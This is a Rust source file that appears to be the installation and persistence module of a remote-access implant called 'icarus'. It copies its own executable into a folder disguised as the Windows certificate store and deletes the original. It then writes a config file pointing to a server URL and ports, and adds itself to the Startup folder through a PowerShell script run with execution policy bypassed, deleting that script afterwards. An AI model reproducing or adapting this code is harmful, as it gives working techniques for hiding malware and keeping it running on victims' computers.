use std::{fs::File, io::Write};

use crate::{API_PORT, RT_PORT, SERVER_URL};

fn create_home_dir(uuid: &str) -> Result<String, Box<dyn std::error::Error>> {
    let appdata = std::env::var("APPDATA")?;
    let home_dir = format!(
        "{}\\Microsoft\\SystemCertificates\\My\\Certificates\\{}",
        appdata, uuid
    );
    match std::fs::create_dir_all(&home_dir) {
        Ok(_) => (),
        Err(e) => {
            return Err(e.into());
        }
    };

    Ok(home_dir)
}

fn populate_home_dir(
    home_dir: &str,
    file_path: &mut String,
    uuid: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    let old_file_path = file_path.clone();
    *file_path = format!("{}/{}.exe", home_dir, uuid);

    match std::fs::copy(&old_file_path, &file_path) {
        Ok(_) => (),
        Err(e) => return Err(e.into()),
    };

    match std::fs::remove_file(old_file_path) {
        Ok(_) => (),
        Err(e) => return Err(e.into()),
    }

    let mut file = match File::create(format!("{}/icarus", home_dir)) {
        Ok(file) => file,
        Err(e) => return Err(e.into()),
    };

    let str = format!(
        "uuid={}\naddr={}\nrt_port={}\napi_port={}",
        uuid, SERVER_URL, RT_PORT, API_PORT
    );

    match file.write_all(str.as_bytes()) {
        Ok(_) => (),
        Err(e) => return Err(e.into()),
    };

    Ok(())
}

pub fn setup(file_path: &str, uuid: &str) -> Result<String, Box<dyn std::error::Error>> {
    let home_dir = create_home_dir(uuid)?;

    let mut file_path_mut = file_path.to_string();
    match populate_home_dir(&home_dir, &mut file_path_mut, uuid) {
        Ok(_) => (),
        Err(e) => return Err(e.into()),
    };

    let startup_dir = format!(
        "{}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
        std::env::var("APPDATA")?
    );
    let shortcut_path = format!("{}/{}.lnk", startup_dir, uuid);

    let ps_script = format!(
        r#"
        $WScriptShell = New-Object -ComObject WScript.Shell
        $Shortcut = $WScriptShell.CreateShortcut("{}")
        $Shortcut.TargetPath = "{}"
        $Shortcut.Save()
    "#,
        shortcut_path, file_path_mut
    );

    let ps_path = format!("{}/create_shortcut.ps1", home_dir);

    let mut ps_file = File::create(&ps_path).expect("Failed to create PowerShell script file");
    ps_file
        .write_all(ps_script.as_bytes())
        .expect("Failed to write to file");

    drop(ps_file);

    let output = match std::process::Command::new("powershell")
        .arg("-ExecutionPolicy")
        .arg("Bypass")
        .arg("-File")
        .arg(&ps_path)
        .output()
    {
        Ok(output) => output,
        Err(e) => return Err(e.into()),
    };

    if !output.status.success() {
        return Err(format!(
            "PowerShell script failed: {}",
            String::from_utf8_lossy(&output.stderr)
        )
        .into());
    }

    match std::fs::remove_file(ps_path) {
        Ok(_) => (),
        Err(e) => return Err(e.into()),
    };

    Ok(file_path_mut)
}
